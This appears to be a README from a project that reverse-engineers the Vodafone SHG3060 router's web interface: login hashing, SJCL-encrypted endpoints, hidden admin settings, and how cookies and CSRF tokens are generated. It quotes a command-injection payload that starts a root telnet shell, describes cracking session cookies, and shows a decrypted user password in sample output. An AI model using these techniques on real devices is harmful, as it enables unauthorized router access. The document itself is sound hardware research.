# Web Interface Analysis
Deep dive into the SJCL encryption used on protected API endpoints, login flow, exposing hidden settings, dissecting cookies and the csrf_token and everything else you need to make automation scripts

## Login Flow
1. If you are not logged the router throws you to http://192.168.2.1/login.html
2. It reads the csrf_token from the page's body
3. It gets /data/user_lang.json?_=1784810460133&csrf_token=HK5C097A75JW5150F8C4 where the _ parameter is the current timestamp used to bypass the cache. csrf_token is actually not needed for this endpoint but it's added on every one since most need it
4. The endpoint responds like that:

```json
   [
     { "encryption_key": "50506B4319EE174C" },
     { "salt": "318AB60839BD0C28" },
     { "region_code": "gr_eles" },
     { "lang_code": "gr_eles" },
     { "without_password": "0" },
     { "page_blocked": "0" },
     { "credential_detail": "1" },
     { "password_enable": "1" },
     { "ipv6_status": "1" },
     { "ipv6_configuration": "1" },
     { "fw_version": "XS6_4.2.00.12" },
     { "wan_ip4_addr": "<your v4 ip>" },
     { "wan_ip6_addr": "<your v6 range>" },
     { "delay_time": "0" },
     { "trying_times": "1" }
   ]
```
5. It parses the encryption_key and the salt. Each time this endpoint receivers a GET request the encryption_key changes, salt changes less often
6. /js/login.js then hashes the password that we inputted with the key `$1$SERCOMM$` and then hashes that hash with the encryption_key
```js
var hash1_pass = hex_hmac_sha256('$1$SERCOMM$', unescape(encodeURIComponent($('input[type="password"]').val())));
var user_password = hex_hmac_sha256(sys_encryption_key, hash1_pass);
```
7. It POSTs to /data/login.json the following body
```ini
LoginName=vodafone&LoginPWD=fe11d2aef2557e5f34670af201983b6682d4ee4b69df300fdc43e2563e5dc52f
```
where LoginPWD is the second hash (user_password)
8. When an endpoint returns `1` it means success, everything else is a fail. If the process completes successfully the client gets a session_id cookie

## Encrypted Endpoints
Sensitive endpoints, usually ones involving passwords, are encrypted from both sides using the Stanford Javascript Crypto Library (SJCL). An encrypted response/request will look like this:
```json
{
  "iv": "UFBrQxnuFwQ=",
  "v": 1,
  "iter": 1000,
  "ks": 128,
  "ts": 64,
  "mode": "ccm",
  "adata": "",
  "cipher": "aes",
  "salt": "RX3LFCps1wQ=",
  "ct": "7BerBso1h6OOZm4WJkg6wAC4uKoydF1d0v8aD6Eb/GoLcBCMpYPRzCo0M0dKlN+wi0bJOc6dVzWWscIRU5vG7x/xnt/d9ifwuhVS+/LTcYuAmTvTRCqE2p2ZpEiRmyiPFvXEiRGnbAO3xRAAESuRm8VWY2x6uqdg/BZj0TYrHKOuH5xwsAUBpUSLRc5eT0NhehoblOIh9hpyieUbO240RSLr96e7kHziMfU="
}
```
The way this works is pretty simple, every time the Log In button is hit (even with a wrong password) login.js creates a new session storage item called `dk` like that:
```js
var passwordSalt = sjcl.codec.hex.toBits(salt);
var derivedKey = sjcl.misc.pbkdf2($('input[type="password"]').val(), passwordSalt, 1000, 128);
var dk_hex = sjcl.codec.hex.fromBits(derivedKey);

setCookie("login_uid", Math.random(), 1);
setWebStorage("dk", dk_hex);
```
`dk` is the encryption password. We can use [this](https://bitwiseshiftleft.github.io/sjcl/demo/) very helpful website to decode a response. Simply paste the dk on the green Password box and the response on the blue Ciphertext box and click the blue decrypt arrow. If anything in the decrypted response looks encoded, is just base64.

## Automation
The `retrieve_user_password.py` python script is a good example of API automation. It performs a login, prints everything and then calls /data/settings_password.json and decrypts the response containg the `vodafone` user's password.

Install the `cryptography` module
```sh
pip install cryptography
```
Then edit the script with your password and run it. The response shall look like that
```
csrf_token: HK4C21EB00JW772FE3E5
encryption_key: 32ED0B657600FE4E
salt: 02AE35BA4EBB1DB0
First Hash: 112f179bc8270db107628f70c9d2fa99265a45ddf0359ec7a5cb078ed65b144b
Second Hash: 6aa57916cc28ce8ef82cd3625e43e3784a1a0a31d205dfa843fd9f1dccd28ecd
Request Body: LoginName=vodafone&LoginPWD=6aa57916cc28ce8ef82cd3625e43e3784a1a0a31d205dfa843fd9f1dccd28ecd
Response Body: "1"
dk: fe269e26194060f03c112be0796b9db5
Cookies: {'session_id': 'mwUdAofXJp+hrHWx7rlTf1eu6sxVnxekBPzgHG/65MPhBYHaSYGplvKUat9QRI6X'}
Encrypted Response: {"iv":"Mu0LZXYA/gQ=","v":1,"iter":1000,"ks":128,"ts":64,"mode":"ccm","adata":"","cipher":"aes","salt":"K0pyViJg7QA=","ct":"d3VorReavkRoXNephCXcHH5Sbz/k2qTH9C76zyNe6uWgdmspigs2szR7v3eaTtVTDogGNP8gav9mN+upiKT4AihVPvTSJXP/UTRG1X8t2W6YzinhM2V32th6Zx57V7yhp0KcTbyx4ADNe0yYffl1kPZK1DsJdZhcqIT2YrJLQODRiSpeG87gWvdQ70hdLwov1nVE1pqLSYsg/pIWDP6lDfJjdXppke3IFvM="}
Decrypted Response: [ { "user_id": "3" }, { "username": "vodafone" }, { "pwd": "U3Bpcm9zMTIzIQ==" }, { "login_without_password": "0" }, { "email": "" }, { "auto_logout": "501015" } ]
Base64 Decoded Password: Spiros123!
```

## Testing Endpoints
For testing endpoints you don't have to write complex scripts. You can call the already existing method from the browser's console. Suppose we want to retrieve `/data/settings_password.json` like the script does then we can just type
```js
page_data_load("settings_password");
```
and the page will call the endpoint for us.
For a POST request we can use `page_data_send` with a path
```js
page_data_send("/data/statussupporteventlog_applog_download.json", 'applog_select=a;echo "#!/bin/sh" > /tmp/slogin;echo "export PATH=/bin:/sbin:/usr/bin:/usr/sbin" >> /tmp/slogin;echo "/bin/sh" >> /tmp/slogin;/bin/chmod 755 /tmp/slogin;/usr/sbin/telnetd -l /tmp/slogin')
```
This example is from user @hwti and even though this injection method does not apply to the SHG3060 it still illustrates how this function can be used.

## Enabling Hidden Settings
Forcing the client to think we are `admin` instead of `enduser` is an old trick, it was used to enable SSH on the H300S and even though these exploits have been patched and most pages are empty it's still interesting to explore as some more settings show up.<br>
Download the [Violentmonkey](https://violentmonkey.github.io/) browser extension and press the plus (+) button to add a new script.<br>
Copy the enable_admin_settings.js userscript from the Scripts folder, paste it there and save
The script should now autoactive the next time you login.<br>
It's recommended you turn it off after exploring since it will break some settings.<br>
Other than `admin` and `enduser`, `booster` is also a valid `usermode` but it has almost no settings.

## The Cookies
After a successfull login, two cookies are created; `login_uid` and `session_id`

### login_uid
This one is pretty simple since it's purely client side, the code bellow creates it:
```js
function setCookie(c_name,value,exdays){
    //alert(c_name + ":" + value);
    var exdate=new Date();
    exdate.setDate(exdate.getDate() + exdays);
    var c_value=escape(value) + ((exdays==null) ? "" : "; expires="+exdate.toUTCString());
    document.cookie=c_name + "=" + c_value;
}

setCookie("login_uid", Math.random(), 1);
```
Basically just `math.random()` and it expires in a day.

### session_id
`session_id` is generated on the server in a more complex manner:
1. `/usr/ww-ap/setup.cgi` takes the current timestamp and uses it as a seed for random
2. It reads four 32bit integers from random
3. It formats them as hexadecimal (`%08X%08X%08X%08X`)
4. It gets the private key using the method `crypt_get_private_key` of `/lib/libsex_crypt.so`
5. Then it calls `AES_cbc_encrypt` of OpenSSL using the private key, iv and the input that is padded to 48 bytes
6. It encodes the output to Base64
7. `/lib/libsalx.so` appends it to `/tmp/sal/misc.sal` which looks like 
<details>
  <summary>misc.sal example</summary>

  ```ini
  Board_CPU=1Ghz
  Board_HW_VERSION=v1
  Board_Manufacture=SERCOMM
  Board_soft_vendor=SERCOMM
  Board_build_time=12 (build @ 2025-05-28, 11:33:34)
  Board_BOOT_version=0.6.0.0
  Board_Manufacture_PID=0000060044465900000000000000000000000000000000000000000000000000000000000000413030310000000000000000420000000000
  Board_HW_ID=4446
  Board_FW_version=XS6_4.2.00.12
  Board_LIB_version=
  Board_CPU_info=AARCH64
  Board_friend_name=Vodafone Power Station WiFi 6
  Board_Model_DES=DSL IAD
  Board_Model_URL=www.sercomm.com
  current_lang=it_eles
  Board_OUI=081605
  Board_Model_Name=SHG3060
  Board_product_class=SHG3060
  reboot_cause=PowerOff
  networkmap=1
  lanip=1
  fw_wan_17=1
  fw_wan_16=1
  fw_wan_15=1
  fw_wan_14=1
  fw_wan_13=1
  fw_wan_12=1
  fw_wan_11=1
  fw_wan_10=1
  fw_wan_9=1
  fw_wan_8=1
  fw_wan_7=1
  fw_wan_6=1
  fw_wan_5=1
  fw_wan_4=1
  fw_wan_3=1
  fw_wan_2=1
  fw_wan_1=1
  fw_wan_0=1
  login_failed_setting=3/10/3600
  qos_cls=1
  last_csrf_token_::1=HK2AD5E750JW3CF49B54
  csrf_token_::1=HK465352B9JW26A44755
  login_key_::1=2846E7235D6A563D
  login_salt_::1=2846E7235D6A563D
  cpm=1
  Autosense_start_time=1945
  fxs_pwrsave_status=0
  Board_modem_fw_version=
  Board_start_up=1
  ```

  <i>The example above is from the emulator therefore some values are either empty or placeholders.</i>
</details>

Using the script `crack_cookie.py` we can crack any cookie created today. Edit the script to insert your private key and iv and run it like so
```sh
python crack_cookie.py aDmTySTG2+Yk1ZQ5/2izWSj5JUPOTyuOXi4XrX1nZYo0StWNwE/dg327HYg7kUUa
```
It should solve it in a few seconds and output something like
```
token: 49BB9BC76C28C638632FAF550EF2A0F7
timestamp: 1785913690
```

## csrf_token
This is appended into every page by the network server, /usr/sbin/mini_httpd. We can get it from login.html without authenticating and there is no rate limiting either.
Its creation process is as follows:
1. `/usr/ww-ap/setup.cgi` reads the CSN (Customer Serial Number) from nvram
2. It converts the last four digits to an integer (eg. `0537` becomes `537`)
3. It get the current timestamp
4. It calls `nmap_get_csrf_seed` from the library `/lib/libnmap_api.so` which calls `networkmap_non_block_ioctl` with opcode `0x21` which reads the socket `/tmp/lan_host.domain` which is managed by the `/usr/sbin/networkmap` daemon
5. It calls `srand()` with (timestamp + csn last 4 digits as int + the nmap value) as the seed
6. Reads two rands and the token is created in the format `HK%08XJW%08X`
<br>nmap variable was always `0xa222eeb0` (`2720198320`) for me, whatever it is.

## Italian
Translations for the web interface are stored in files of the format `Cat#.csv` and there are three columns; one English, one Italian and one Greek but there's no option to enable italian in the web ui. To do so simply open the console and if you are on the login screen type
```js
not_login_lang_change("it_eles")
```
or if you are already logged in type
```js
lang_change("it_eles")
```
and hit enter. The pages should now be in Italian.
